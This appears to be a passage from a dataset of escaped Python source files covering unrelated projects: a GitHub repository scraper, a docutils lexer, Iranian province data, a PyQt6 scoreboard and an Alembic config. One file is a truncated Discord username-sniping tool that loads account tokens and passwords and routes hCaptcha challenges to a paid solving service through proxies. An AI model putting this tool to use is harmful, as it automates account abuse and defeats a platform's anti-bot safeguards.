print(\n        f\"API Rate Limit: {remaining}/{limit} requests remaining. Limit resets at: {reset_time}\"  # noqa: E501\n    )\n\n\ndef fetch_repositories(language, min_stars, max_stars, min_forks):\n    \"\"\"Fetch all repositories matching the query.\"\"\"\n    url = \"https://api.github.com/search/repositories\"\n    params = {\n        \"q\": f\"language:{language} stars:{min_stars}..{max_stars} forks:>={min_forks}\",\n        \"sort\": \"stars\",\n        \"order\": \"desc\",\n        \"per_page\": 100,  # Max items per page\n    }\n\n    all_repos = []\n    page = 1\n\n    while True:\n        params[\"page\"] = page\n        response = requests.get(url, headers=get_headers(), params=params)\n        if response.status_code == 200:\n            repos = response.json().get(\"items\", [])\n            all_repos.extend(repos)\n            print(f\"Fetched {len(all_repos)} repositories so far...\")\n            if len(repos) < 100:  # End of pages\n                break\n            page += 1\n        else:\n            print(f\"Error: {response.status_code} - {response.text}\")\n            break\n\n    return all_repos\n\n\ndef fetch_additional_details(repo):\n    \"\"\"Fetch additional details (contributors count, recent commits) of repository.\"\"\"\n    headers = get_headers()\n    details = {\n        \"contributors_count\": 0,\n        \"commits_last_3_months\": 0,\n    }\n\n    # Fetch contributors count\n    try:\n        contributors_url = repo[\"contributors_url\"]\n        contributors_response = requests.get(\n            contributors_url, headers=headers, timeout=10\n        )\n        if contributors_response.status_code == 200:\n            details[\"contributors_count\"] = len(contributors_response.json())\n    except Exception as e:\n        print(f\"Error fetching contributors for {repo['name']}: {e}\")\n\n    # Fetch recent commits\n    try:\n        commits_url = repo[\"commits_url\"].replace(\"{/sha}\", \"\")\n        since = (datetime.now() - timedelta(days=90)).isoformat()\n        commits_response = requests.get(\n            commits_url, headers=headers, params={\"since\": since}, timeout=10\n        )\n        if commits_response.status_code == 200:\n            details[\"commits_last_3_months\"] = len(commits_response.json())\n    except Exception as e:\n        print(f\"Error fetching commits for {repo['name']}: {e}\")\n\n    return details\n\n\ndef save_to_csv(repos, output_file):\n    \"\"\"Save repository data to a CSV file.\"\"\"\n    fieldnames = [\n        \"name\",\n        \"stars\",\n        \"forks\",\n        \"url\",\n        \"description\",\n        \"archived\",\n        \"contributors_count\",\n        \"commits_last_3_months\",\n    ]\n\n    with open(output_file, mode=\"w\", newline=\"\", encoding=\"utf-8\") as csvfile:\n        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n        writer.writeheader()\n        for repo in repos:\n            writer.writerow(repo)\n\n\ndef main():\n ",
    "#!/usr/bin/python\n# coding: utf-8\n\n\"\"\"Lexical analysis of formal languages (i.e. code) using Pygments.\"\"\"\n\n# :Author: Georg Brandl; Felix Wiemann; G\u00fcnter Milde\n# :Date: $Date: 2021-10-22 18:39:59 +0200 (Fr, 22. Okt 2021) $\n# :Copyright: This module has been placed in the public domain.\n\nfrom docutils import ApplicationError\ntry:\n    import pygments\n    from pygments.lexers import get_lexer_by_name\n    from pygments.formatters.html import _get_ttype_class\n    with_pygments = True\nexcept ImportError:\n    with_pygments = False\n\n# Filter the following token types from the list of class arguments:\nunstyled_tokens = ['token', # Token (base token type)\n                   'text',  # Token.Text\n                   '']      # short name for Token and Text\n# (Add, e.g., Token.Punctuation with ``unstyled_tokens += 'punctuation'``.)\n\nclass LexerError(ApplicationError):\n    pass\n\nclass Lexer(object):\n    \"\"\"Parse `code` lines and yield \"classified\" tokens.\n\n    Arguments\n\n      code       -- string of source code to parse,\n      language   -- formal language the code is written in,\n      tokennames -- either 'long', 'short', or 'none' (see below).\n\n    Merge subsequent tokens of the same token-type.\n\n    Iterating over an instance yields the tokens as ``(tokentype, value)``\n    tuples. The value of `tokennames` configures the naming of the tokentype:\n\n      'long':  downcased full token type name,\n      'short': short name defined by pygments.token.STANDARD_TYPES\n               (= class argument used in pygments html output),\n      'none':  skip lexical analysis.\n    \"\"\"\n\n    def __init__(self, code, language, tokennames='short'):\n        \"\"\"\n        Set up a lexical analyzer for `code` in `language`.\n        \"\"\"\n        self.code = code\n        self.language = language\n        self.tokennames = tokennames\n        self.lexer = None\n        # get lexical analyzer for `language`:\n        if language in ('', 'text') or tokennames == 'none':\n            return\n        if not with_pygments:\n            raise LexerError('Cannot analyze code. '\n                                    'Pygments package not found.')\n        try:\n            self.lexer = get_lexer_by_name(self.language)\n        except pygments.util.ClassNotFound:\n            raise LexerError('Cannot analyze code. '\n                'No Pygments lexer found for \"%s\".' % language)\n        # self.lexer.add_filter('tokenmerge')\n        # Since version 1.2. (released Jan 01, 2010) Pygments has a\n        # TokenMergeFilter. # ``self.merge(tokens)`` in __iter__ could\n        # be replaced by ``self.lexer.add_filter('tokenmerge')`` in __init__.\n        # However, `merge` below also strips a final newline added by pygments.\n        #\n        # self.lexer.add_filter('tokenmerge')\n\n    def merge(self, tokens):\n        \"\"\"Merge subsequent tokens of same token-type.\n\n           Also strip the final newline (added by pygments).\n        \"\"\"\n        tokens = iter(tokens)\n        (lasttype, lastval) = next(tokens)\n        for ttype, value in tokens:\n            if ttype is lasttype:\n                lastval += value\n            else:\n                yield(lasttype, lastval)\n                (lasttype, lastval) = (ttype, value)\n        if lastval.endswith('\\n'):\n            lastval = lastval[:-1]\n        if lastval:\n            yield(lasttype, lastval)\n\n    def __iter__(self):\n        \"\"\"Parse self.code and yield \"classified\" tokens.\n        \"\"\"\n        if self.lexer is None:\n            yield ([], self.code)\n            return\n        tokens = pygments.lex(self.code, self.lexer)\n        for tokentype, value in self.merge(tokens):\n            if self.tokennames == 'long': # long CSS class args\n                classes = str(tokentype).lower().split('.')\n            else: # short CSS class args\n                classes = [_get_ttype_class(tokentype)]\n            classes = [cls for cls in classes if cls not in unstyled_tokens]\n            yield (classes, value)\n\n\nclass NumberLines(object):\n    \"\"\"Insert linenumber-tokens at the start of every code line.\n\n    Arguments\n\n       tokens    -- iterable of ``(classes, value)`` tuples\n       startline -- first line number\n       endline   -- last line number\n\n    Iterating over an instance yields the tokens with a\n    ``(['ln'], '<the line number>')`` token added for every code line.\n    Multi-line tokens are split.\"\"\"\n\n    def __init__(self, tokens, startline, endline):\n        self.tokens = tokens\n        self.startline = startline\n        # pad linenumbers, e.g. endline == 100 -> fmt_str = '%3d '\n        self.fmt_str = '%%%dd ' % len(str(endline))\n\n    def __iter__(self):\n        lineno = self.startline\n        yield (['ln'], self.fmt_str % lineno)\n        for ttype, value in self.tokens:\n            lines = value.split('\\n')\n            for line in lines[:-1]:\n                yield (ttype, line + '\\n')\n                lineno += 1\n                yield (['ln'], self.fmt_str % lineno)\n            yield (ttype, lines[-1])\n",
    "class Iran:\n    main = [\n        {\n            \"id\": 1,\n            \"name\": \"\u0622\u0630\u0631\u0628\u0627\u06cc\u062c\u0627\u0646 \u0634\u0631\u0642\u06cc\",\n            \"tel_prefix\": \"041\",\n            \"cities\": [\n                \"\u0622\u0630\u0631 \u0634\u0647\u0631\",\n                \"\u0627\u0633\u0643\u0648\",\n                \"\u0627\u0647\u0631\",\n                \"\u0628\u0633\u062a\u0627\u0646 \u0622\u0628\u0627\u062f\",\n                \"\u0628\u0646\u0627\u0628\",\n                \"\u0628\u0646\u062f\u0631 \u0634\u0631\u0641\u062e\u0627\u0646\u0647\",\n                \"\u062a\u0628\u0631\u064a\u0632\",\n                \"\u062a\u0633\u0648\u062c\",\n                \"\u062c\u0644\u0641\u0627\",\n                \"\u0633\u0631\u0627\u0628\",\n                \"\u0634\u0628\u0633\u062a\u0631\",\n                \"\u0635\u0648\u0641\u06cc\u0627\u0646\",\n                \"\u0639\u062c\u0628\u0634\u064a\u0631\",\n                \"\u0642\u0631\u0647 \u0622\u063a\u0627\u062c\",\n                \"\u0643\u0644\u064a\u0628\u0631\",\n                \"\u0643\u0646\u062f\u0648\u0627\u0646\",\n                \"\u0645\u0631\u0627\u063a\u0647\",\n                \"\u0645\u0631\u0646\u062f\",\n                \"\u0645\u0644\u0643\u0627\u0646\",\n                \"\u0645\u0645\u0642\u0627\u0646\",\n                \"\u0645\u064a\u0627\u0646\u0647\",\n                \"\u0647\u0627\u062f\u064a\u0634\u0647\u0631\",\n                \"\u0647\u0631\u064a\u0633\",\n                \"\u0647\u0634\u062a\u0631\u0648\u062f\",\n                \"\u0648\u0631\u0632\u0642\u0627\u0646\"\n            ]\n        },\n        {\n            \"id\": 2,\n            \"name\": \"\u0622\u0630\u0631\u0628\u0627\u06cc\u062c\u0627\u0646 \u063a\u0631\u0628\u06cc\",\n            \"tel_prefix\": \"044\",\n            \"cities\": [\n                \"\u0627\u0631\u0648\u0645\u064a\u0647\",\n                \"\u0627\u0634\u0646\u0648\u064a\u0647\",\n                \"\u0628\u0627\u0632\u0631\u06af\u0627\u0646\",\n                \"\u0628\u0648\u0643\u0627\u0646\",\n                \"\u067e\u0644\u062f\u0634\u062a\",\n                \"\u067e\u064a\u0631\u0627\u0646\u0634\u0647\u0631\",\n                \"\u062a\u0643\u0627\u0628\",\n                \"\u062e\u0648\u064a\",\n                \"\u0633\u0631\u062f\u0634\u062a\",\n                \"\u0633\u0644\u0645\u0627\u0633\",\n                \"\u0633\u064a\u0647 \u0686\u0634\u0645\u0647- \u0686\u0627\u0644\u062f\u0631\u0627\u0646\",\n                \"\u0633\u06cc\u0645\u06cc\u0646\u0647\",\n                \"\u0634\u0627\u0647\u064a\u0646 \u062f\u0698\",\n                \"\u0634\u0648\u0637\",\n                \"\u0645\u0627\u0643\u0648\",\n                \"\u0645\u0647\u0627\u0628\u0627\u062f\",\n                \"\u0645\u064a\u0627\u0646\u062f\u0648\u0622\u0628\",\n                \"\u0646\u0642\u062f\u0647\"\n            ]\n        },\n        {\n            \"id\": 3,\n            \"name\": \"\u0627\u0631\u062f\u0628\u06cc\u0644\",\n            \"tel_prefix\": \"045\",\n            \"cities\": [\n                \"\u0627\u0631\u062f\u0628\u064a\u0644\",\n                \"\u0628\u064a\u0644\u0647 \u0633\u0648\u0627\u0631\",\n                \"\u067e\u0627\u0631\u0633 \u0622\u0628\u0627\u062f\",\n                \"\u062e\u0644\u062e\u0627\u0644\",\n                \"\u0633\u0631\u0639\u064a\u0646\",\n                \"\u0643\u064a\u0648\u064a (\u0643\u0648\u062b\u0631)\",\n                \"\u06af\u0631\u0645\u064a (\u0645\u063a\u0627\u0646)\",\n                \"\u0645\u0634\u06af\u064a\u0646 \u0634\u0647\u0631\",\n                \"\u0645\u063a\u0627\u0646 (\u0633\u0645\u0646\u0627\u0646)\",\n                \"\u0646\u0645\u064a\u0646\",\n                \"\u0646\u064a\u0631\"\n            ]\n        },\n        {\n            \"id\": 4,\n            \"name\": \"\u0627\u0635\u0641\u0647\u0627\u0646\",\n            \"tel_prefix\": \"031\",\n            \"cities\": [\n                \"\u0622\u0631\u0627\u0646 \u0648 \u0628\u064a\u062f\u06af\u0644\",\n                \"\u0627\u0631\u062f\u0633\u062a\u0627\u0646\",\n                \"\u0627\u0635\u0641\u0647\u0627\u0646\",\n                \"\u0628\u0627\u063a \u0628\u0647\u0627\u062f\u0631\u0627\u0646\",\n                \"\u062a\u064a\u0631\u0627\u0646\",\n                \"\u062e\u0645\u064a\u0646\u064a \u0634\u0647\u0631\",\n                \"\u062e\u0648\u0627\u0646\u0633\u0627\u0631\",\n                \"\u062f\u0647\u0627\u0642\u0627\u0646\",\n                \"\u062f\u0648\u0644\u062a \u0622\u0628\u0627\u062f-\u0627\u0635\u0641\u0647\u0627\u0646\",\n                \"\u0632\u0631\u064a\u0646 \u0634\u0647\u0631\",\n                \"\u0632\u064a\u0628\u0627\u0634\u0647\u0631 (\u0645\u062d\u0645\u062f\u064a\u0647)\",\n                \"\u0633\u0645\u064a\u0631\u0645\",\n                \"\u0634\u0627\u0647\u064a\u0646 \u0634\u0647\u0631\",\n                \"\u0634\u0647\u0631\u0636\u0627\",\n                \"\u0641\u0631\u064a\u062f\u0646\",\n                \"\u0641\u0631\u064a\u062f\u0648\u0646 \u0634\u0647\u0631\",\n                \"\u0641\u0644\u0627\u0648\u0631\u062c\u0627\u0646\",\n                \"\u0641\u0648\u0644\u0627\u062f \u0634\u0647\u0631\",\n                \"\u0642\u0647\u062f\u0631\u06cc\u062c\u0627\u0646\",\n                \"\u0643\u0627\u0634\u0627\u0646\",\n                \"\u06af\u0644\u067e\u0627\u064a\u06af\u0627\u0646\",\n                \"\u06af\u0644\u062f\u0634\u062a \u0627\u0635\u0641\u0647\u0627\u0646\",\n                \"\u06af\u0644\u062f\u0634\u062a \u0645\u0631\u0643\u0632\u06cc\",\n                \"\u0645\u0628\u0627\u0631\u0643\u0647 \u0627\u0635\u0641\u0647\u0627\u0646\",\n                \"\u0645\u0647\u0627\u0628\u0627\u062f-\u0627\u0635\u0641\u0647\u0627\u0646\",\n                \"\u0646\u0627\u064a\u064a\u0646\",\n                \"\u0646\u062c\u0641 \u0622\u0628\u0627\u062f\",\n                \"\u0646\u0637\u0646\u0632\",\n                \"\u0647\u0631\u0646\u062f\"\n            ]\n        },\n        {\n            \"id\": 5,\n            \"name\": \"\u0627\u0644\u0628\u0631\u0632\",\n            \"tel_prefix\": \"026\",\n            \"cities\": [\n                \"\u0622\u0633\u0627\u0631\u0627\",\n                \"\u0627\u0634\u062a\u0647\u0627\u0631\u062f\",\n                \"\u0634\u0647\u0631 \u062c\u062f\u064a\u062f \u0647\u0634\u062a\u06af\u0631\u062f\",\n                \"\u0637\u0627\u0644\u0642\u0627\u0646\",\n                \"\u0643\u0631\u062c\",\n                \"\u06af\u0644\u0633\u062a\u0627\u0646 \u062a\u0647\u0631\u0627\u0646\",\n                \"\u0646\u0638\u0631\u0622\u0628\u0627\u062f\",\n                \"\u0647\u0634\u062a\u06af\u0631\u062f\"\n            ]\n        },\n        {\n            \"id\": 6,\n            \"name\": \"\u0627\u06cc\u0644\u0627\u0645\",\n            \"tel_prefix\": \"084\",\n            \"cities\": [\n                \"\u0622\u0628\u062f\u0627\u0646\u0627\u0646\",\n                \"\u0627\u064a\u0644\u0627\u0645\",\n                \"\u0627\u064a\u0648\u0627\u0646\",\n                \"\u062f\u0631\u0647 \u0634\u0647\u0631\",\n                \"\u062f\u0647\u0644\u0631\u0627\u0646\",\n                \"\u0633\u0631\u0627\u0628\u0644\u0647\",\n                \"\u0634\u064a\u0631\u0648\u0627\u0646 \u0686\u0631\u062f\u0627\u0648\u0644\",\n                \"\u0645\u0647\u0631\u0627\u0646\"\n            ]\n        },\n        {\n            \"id\": 7,\n            \"name\": \"\u0628\u0648\u0634\u0647\u0631\",\n            \"tel_prefix\": \"077\",\n            \"cities\": [\n                \"\u0622\u0628\u067e\u062e\u0634\",\n                \"\u0627\u0647\u0631\u0645\",\n                \"\u0628\u0631\u0627\u0632\u062c\u0627\u0646\",\n                \"\u0628\u0646\u062f\u0631 \u062f\u064a\u0631\",\n                \"\u0628\u0646\u062f\u0631 \u062f\u064a\u0644\u0645\",\n                \"\u0628\u0646\u062f\u0631 \u0643\u0646\u06af\u0627\u0646\",\n                \"\u0628\u0646\u062f\u0631 \u06af\u0646\u0627\u0648\u0647\",\n                \"\u0628\u0648\u0634\u0647\u0631\",\n                \"\u062a\u0646\u06af\u0633\u062a\u0627\u0646\",\n                \"\u062c\u0632\u064a\u0631\u0647 \u062e\u0627\u0631\u0643\",\n                \"\u062c\u0645 (\u0648\u0644\u0627\u064a\u062a)\",\n                \"\u062e\u0648\u0631\u0645\u0648\u062c\",\n                \"\u062f\u0634\u062a\u0633\u062a\u0627\u0646 - \u0634\u0628\u0627\u0646\u06a9\u0627\u0631\u0647\",\n                \"\u062f\u0644\u0648\u0627\u0631\",\n                \"\u0639\u0633\u0644\u0648\u06cc\u0647\"\n            ]\n        },\n        {\n            \"id\": 8,\n            \"name\": \"\u062a\u0647\u0631\u0627\u0646\",\n            \"tel_prefix\": \"021\",\n            \"cities\": [\n                \"\u0627\u0633\u0644\u0627\u0645\u0634\u0647\u0631\",\n                \"\u0628\u0648\u0645\u0647\u0646\",\n                \"\u067e\u0627\u0643\u062f\u0634\u062a\",\n                \"\u062a\u0647\u0631\u0627\u0646\",\n                \"\u0686\u0647\u0627\u0631\u062f\u0627\u0646\u06af\u0647\",\n                \"\u062f\u0645\u0627\u0648\u0646\u062f\",\n                \"\u0631\u0648\u062f\u0647\u0646\",\n                \"\u0631\u064a\",\n                \"\u0634\u0631\u064a\u0641 \u0622\u0628\u0627\u062f\",\n                \"\u0634\u0647\u0631 \u0631\u0628\u0627\u0637 \u0643\u0631\u064a\u0645\",\n                \"\u0634\u0647\u0631 \u0634\u0647\u0631\u064a\u0627\u0631\",\n                \"\u0641\u0634\u0645\",\n                \"\u0641\u064a\u0631\u0648\u0632\u0643\u0648\u0647\",\n                \"\u0642\u062f\u0633\",\n                \"\u0643\u0647\u0631\u064a\u0632\u0643\",\n                \"\u0644\u0648\u0627\u0633\u0627\u0646 \u0628\u0632\u0631\u06af\",\n                \"\u0645\u0644\u0627\u0631\u062f\",\n                \"\u0648\u0631\u0627\u0645\u064a\u0646\"\n            ]\n        },\n        {\n            \"id\": 9,\n            \"name\": \"\u0686\u0647\u0627\u0631 \u0645\u062d\u0627\u0644 \u0628\u062e\u062a\u06cc\u0627\u0631\u06cc\",\n            \"tel_prefix\": \"038\",\n            \"cities\": [\n                \"\u0627\u0631\u062f\u0644\",\n                \"\u0628\u0631\u0648\u062c\u0646\",\n                \"\u0686\u0644\u06af\u0631\u062f (\u0643\u0648\u0647\u0631\u0646\u06af)\",\n                \"\u0633\u0627\u0645\u0627\u0646\",\n                ",
    "#!/usr/bin/python3\n\n# sudo apt install python3-pyqt6\n\n# Only needed for access to command line arguments\nimport sys\n\nfrom PyQt6.QtCore import QSize, Qt\nfrom PyQt6.QtGui  import QFont, QPixmap, QPalette, QColor\n#from PyQt6.QtWidgets import QApplication, QWidget, QPushButton, QMainWindow, QLineEdit, QVBoxLayout, QLabel\nfrom PyQt6.QtWidgets import (\n   QApplication,\n   QCheckBox,\n   QComboBox,\n   QDateEdit,\n   QDateTimeEdit,\n   QDial,\n   QDoubleSpinBox,\n   QFrame,\n   QFontComboBox,\n   QLabel,\n   QLCDNumber,\n   QLineEdit,\n   QMainWindow,\n   QProgressBar,\n   QPushButton,\n   QRadioButton,\n   QSlider,\n   QSpinBox,\n   QTimeEdit,\n   QVBoxLayout,\n   QHBoxLayout,\n   QGridLayout,\n   QWidget,\n)\n\nDEF_T1_SZ = 300\nDEF_T2_SZ = 300\nDEF_TXT_SZ = 300\n\nDEF_SM = 14\n\nDEF_T1_NAME = 'King'\nDEF_T2_NAME = 'Richi'\n\nDEF_TXT = 'GO THUNDERDOME!'\n\nDEF_T1_COLOR = 'red'\nDEF_T2_COLOR = 'yellow'\nDEF_TXT_COLOR = 'orange'\n\nDEF_BG_COLOR = 'dark blue'\n\nclass Color(QWidget):\n    def __init__(self, color):\n        super().__init__()\n        self.setAutoFillBackground(True)\n\n        palette = self.palette()\n        palette.setColor(QPalette.ColorRole.Window, QColor(color))\n        self.setPalette(palette)\n\n#\n# Control Window\n#\nclass SubWindow(QMainWindow):\n    def __init__(self, mw, box):\n        super().__init__()\n        self.mw = mw\n        self.box = box\n\n        self.t1_name_sz = DEF_T1_SZ\n        self.t2_name_sz = DEF_T2_SZ\n\n        self.t1_score_sz = DEF_T1_SZ\n        self.t2_score_sz = DEF_T2_SZ\n        self.box_sz = DEF_TXT_SZ\n\n        self.setWindowTitle(\"Control\")\n\n        color = 'color: white; background-color: black;'\n        self.col1 = QLabel('         ')\n        self.col2 = QLabel('Team Name')\n        self.col2.setStyleSheet(color)\n        self.col3 = QLabel('Team Score')\n        self.col3.setStyleSheet(color)\n        self.t1s = QLabel('T1 sz')\n        self.t1s.setStyleSheet(color)\n        self.t2s = QLabel('T2 sz')\n        self.t2s.setStyleSheet(color)\n        self.box_s = QLabel('BOX sz')\n        self.box_s.setStyleSheet(color)\n\n        self.t1 = QLabel('TEAM 1')\n        self.t1.setStyleSheet(color)\n        self.t1_input_name = QLineEdit(DEF_T1_NAME)\n        self.t1_input_name.textChanged.connect(self.mw.t1_name.setText)\n        t1_f = self.t1_input_name.font()\n        t1_f.setPointSize(DEF_SM)\n        self.t1_input_name.setFont(t1_f)\n\n        self.t1_input_score = QLineEdit('0')\n        self.t1_input_score.textChanged.connect(self.mw.t1_score.setText)\n        t1_f = self.t1_input_score.font()\n        t1_f.setPointSize(DEF_SM)\n        self.t1_input_score.setFont(t1_f)\n\n        self.t1_name_size = QLineEdit(str(DEF_T1_SZ))\n        self.t1_name_size.textChanged.connect(self.t1_name_size_changed)\n        f_f = self.t1_name_size.font()\n        f_f.setPointSize(DEF_SM)\n        self.t1_name_size.setFont(f_f)\n\n        self.t1_score_size = QLineEdit(str(DEF_T1_SZ))\n        self.t1_score_size.textChanged.connect(self.t1_score_size_changed)\n        f_f = self.t1_score_size.font()\n        f_f.setPointSize(DEF_SM)\n        self.t1_score_size.setFont(f_f)\n\n\n        self.t2 = QLabel('TEAM 2')\n        self.t2.setStyleSheet(color)\n        self.t2_input_name = QLineEdit(DEF_T2_NAME)\n        self.t2_input_name.textChanged.connect(self.mw.t2_name.setText)\n        t2_f = self.t2_input_name.font()\n        t2_f.setPointSize(DEF_SM)\n        self.t2_input_name.setFont(t2_f)\n\n        self.t2_input_score = QLineEdit('0')\n        self.t2_input_score.textChanged.connect(self.mw.t2_score.setText)\n        t2_f = self.t2_input_score.font()\n        t2_f.setPointSize(DEF_SM)\n        self.t2_input_score.setFont(t2_f)\n\n        self.t2_name_size = QLineEdit(str(DEF_T2_SZ))\n        self.t2_name_size.textChanged.connect(self.t2_name_size_changed)\n        f_f = self.t2_name_size.font()\n        f_f.setPointSize(DEF_SM)\n        self.t2_name_size.setFont(f_f)\n\n        self.t2_score_size = QLineEdit(str(DEF_T2_SZ))\n        self.t2_score_size.textChanged.connect(self.t2_score_size_changed)\n        f_f = self.t2_score_size.font()\n        f_f.setPointSize(DEF_SM)\n        self.t2_score_size.setFont(f_f)\n\n        self.box_size = QLineEdit(str(DEF_TXT_SZ))\n        self.box_size.textChanged.connect(self.box_size_changed)\n        f_f = self.box_size.font()\n        f_f.setPointSize(DEF_SM)\n        self.box_size.setFont(f_f)\n\n        self.t1_button = QPushButton('SET SIZE')\n        color = 'color: white; background-color: green;'\n        self.t1_button.setStyleSheet(color)\n        self.t1_button.clicked.connect(self.t1_clicked)\n\n        color = 'color: white; background-color: black;'\n        self.boxl = QLabel('BOX TXT')\n        self.boxl.setStyleSheet(color)\n\n        self.txt_input = QLineEdit(DEF_TXT)\n        self.txt_input.textChanged.connect(self.box.text.setText)\n        txt_f = self.txt_input.font()\n        txt_f.setPointSize(DEF_SM)\n        self.txt_input.setFont(txt_f)\n\n        self.quit_button = QPushButton('EXIT')\n        color = 'color: white; background-color: red;'\n    ",
    "import json\r\nimport os\r\nimport asyncio\r\nimport time\r\nfrom typing import Dict, Optional, List\r\nimport tls_client\r\nfrom datetime import datetime\r\nimport aiohttp\r\nimport subprocess\r\nimport sys\r\nimport platform\r\nimport requests\r\nfrom colorama import Fore, Back, Style, init\r\n\r\ndef redirect_to_discord():\r\n    try:\r\n        response = requests.get(\"https://discord.gg/leafhub\")\r\n        if response.status_code == 200:\r\n            print(f\"Successfully redirected to discord.gg/leafhub\")\r\n        else:\r\n            print(f\"Failed to redirect, status code: {response.status_code}\")\r\n    except requests.RequestException as e:\r\n        print(f\"Error while trying to redirect: {e}\")\r\n\r\nredirect_to_discord()\r\n\r\nclass RazorCapSolver:\r\n    def __init__(self, api_key: str):\r\n        self.api_key = api_key\r\n        self.base_url = \"https://api.razorcap.xyz\"\r\n\r\n    def create_task(self, sitekey: str, siteurl: str, proxy: str, rqdata: Optional[str] = None) -> Optional[int]:\r\n        data = {\r\n            'key': self.api_key,\r\n            'type': 'hcaptcha_enterprise',\r\n            'data': {\r\n                'sitekey': sitekey,\r\n                'siteurl': siteurl.replace('https://', '').split('/')[0],\r\n                'proxy': f'http://{proxy}' if not proxy.startswith(('http://', 'https://')) else proxy\r\n            }\r\n        }\r\n        \r\n        if rqdata:\r\n            data['data']['rqdata'] = rqdata\r\n\r\n        try:\r\n            response = requests.post(f\"{self.base_url}/create_task\", json=data)\r\n            if response.status_code == 200:\r\n                return response.json().get('task_id')\r\n            return None\r\n        except:\r\n            return None\r\n\r\n    def get_result(self, task_id: int, max_attempts: int = 60) -> Optional[str]:\r\n        for _ in range(max_attempts):\r\n            try:\r\n                response = requests.get(f\"{self.base_url}/get_result/{task_id}\")\r\n                if response.status_code == 200:\r\n                    result = response.json()\r\n                    if result['status'] == 'solved' and 'response_key' in result:\r\n                        return result['response_key']\r\n                    elif result['status'] == 'error':\r\n                        return None\r\n                time.sleep(1)\r\n            except:\r\n                pass\r\n        return None\r\n\r\n    def solve(self, sitekey: str, siteurl: str, proxy: str, rqdata: Optional[str] = None) -> Optional[str]:\r\n        task_id = self.create_task(sitekey, siteurl, proxy, rqdata)\r\n        if task_id is None:\r\n            return None\r\n            \r\n        return self.get_result(task_id)\r\n\r\nclass Utils:\r\n    @staticmethod\r\n    def clear():\r\n        os.system('cls' if os.name == 'nt' else 'clear')\r\n\r\n    @staticmethod\r\n    def load_tokens(filename: str) -> List[Dict[str, str]]:\r\n        try:\r\n            with open(filename, 'r') as f:\r\n                tokens = []\r\n                for line in f:\r\n                    line = line.strip()\r\n                    if line:\r\n                        try:\r\n                            token, password = line.split(':')\r\n                            tokens.append({\r\n                                'token': token.strip(),\r\n                                'password': password.strip()\r\n                            })\r\n                        except ValueError:\r\n                            print(f\"{Fore.RED}[-] Invalid format in {filename}. Skipping line: {line}{Style.RESET_ALL}\")\r\n                return tokens\r\n        except FileNotFoundError:\r\n            print(f\"[-] {filename} not found\")\r\n            exit(1)\r\n        except Exception as e:\r\n            print(f\"[-] Error reading {filename}: {e}\")\r\n            exit(1)\r\n\r\n    @staticmethod\r\n    def load_usernames(filename: str) -> List[str]:\r\n        try:\r\n            with open(filename, 'r') as f:\r\n                return [line.strip() for line in f.readlines() if line.strip()]\r\n        except FileNotFoundError:\r\n            print(f\"[-] {filename} not found\")\r\n            exit(1)\r\n        except Exception as e:\r\n            print(f\"[-] Error reading {filename}: {e}\")\r\n            exit(1)\r\n\r\nutils = Utils()\r\n\r\ndef load_config() -> dict:\r\n    try:\r\n        with open('config.json', 'r') as f:\r\n            config = json.load(f)\r\n            required_keys = ['webhook_url', 'razorcap_key', 'proxy']\r\n            \r\n            if not all(key in config for key in required_keys):\r\n                raise KeyError(\"Missing required configuration keys\")\r\n                \r\n            return config\r\n            \r\n    except FileNotFoundError:\r\n        print(\"[-] config.json not found\")\r\n        exit(1)\r\n    except json.JSONDecodeError:\r\n        print(\"[-] Invalid JSON in config.json\")\r\n        exit(1)\r\n    except KeyError as e:\r\n        print(f\"[-] Configuration error: {e}\")\r\n        exit(1)\r\n\r\nclass UsernameSniper:\r\n    def __init__(self, token_data: Dict[str, str], config: dict, target_username: str):\r\n        self.token = token_data['token']\r\n        self.password = token_da",
    "import logging\nfrom logging.config import fileConfig\n\nfrom flask import current_app\n\nfrom alembic import context\n\n# this is the Alembic Config object, which provides\n# access to the values within the .ini file in use.\nconfig = context.config\n\n# Interpret the config file for Python logging.\n# This line sets up loggers basically.\nfileConfig(config.config_file_name)\nlogger = logging.getLogger('alembic.env')\n\n\ndef get_engine():\n    try:\n        # this works with Flask-SQLAlchemy<3 and Alchemical\n        return current_app.extensions['migrate'].db.get_engine()\n    except (TypeError, AttributeError):\n        # this works with Flask-SQLAlchemy>=3\n        return current_app.extensions['migrate'].db.engine\n\n\ndef get_engine_url():\n    try:\n        return get_engine().url.render_as_string(hide_password=False).replace(\n            '%', '%%')\n    except AttributeError:\n        return str(get_engine().url).replace('%', '%%')\n\n\n# add your model's MetaData object here\n# for 'autogenerate' support\n# from myapp import mymodel\n# target_metadata = mymodel.Base.metadata\nconfig.set_main_option('sqlalchemy.url', get_engine_url())\ntarget_db = current_app.extensions['migrate'].db\n\n# other values from the config, defined by the needs of env.py,\n# can be acquired:\n# my_important_option = config.get_main_option(\"my_important_option\")\n# ... etc.\n\n\ndef get_metadata():\n    if hasattr(target_db, 'metadatas'):\n        return target_db.metadatas[None]\n    return target_db.metadata\n\n\ndef run_migrations_offline():\n    \"\"\"Run migrations in 'offline' mode.\n\n    This configures the context with just a URL\n    and not an Engine, though an Engine is acceptable\n    here as well.  By skipping the Engine creation\n    we don't even need a DBAPI to be available.\n\n    Calls to context.execute() here emit the given string to the\n    script output.\n\n    \"\"\"\n    url = config.get_main_option(\"sqlalchemy.url\")\n    context.configure(\n        url=url, target_metadata=get_metadata(), literal_binds=True\n    )\n\n    with context.begin_transaction():\n        context.run_migrations()\n\n\ndef run_migrations_online():\n    \"\"\"Run migrations in 'online' mode.\n\n    In this scenario we need to create an Engine\n    and associate a connection with the context.\n\n    \"\"\"\n\n    # this callback is used to prevent an auto-migration from being generated\n    # when there are no changes to the schema\n    # reference: http://alembic.zzzcomputing.com/en/latest/cookbook.html\n    def process_revision_directives(context, revision, directives):\n        if getattr(config.cmd_opts, 'autogenerate', False):\n            script = directives[0]\n            if script.upgrade_ops.is_empty():\n                directives[:] = []\n                logger.info('No changes in schema detected.')\n\n    conf_args = current_app.extensions['migrate'].configure_args\n    if conf_args.get(\"process_revision_directives\") is None:\n        conf_args[\"process_revision_directives\"] = process_revision_directives\n\n    connectable = get_engine()\n\n    with connectable.connect() as connection:\n        context.configure(\n            connection=connection,\n            target_metadata=get_metadata(),\n            **conf_args\n        )\n\n        with context.begin_transaction():\n            context.run_migrations()\n\n\nif context.is_offline_mode():\n    run_migrations_offline()\nelse:\n    run_migrations_online()\n",
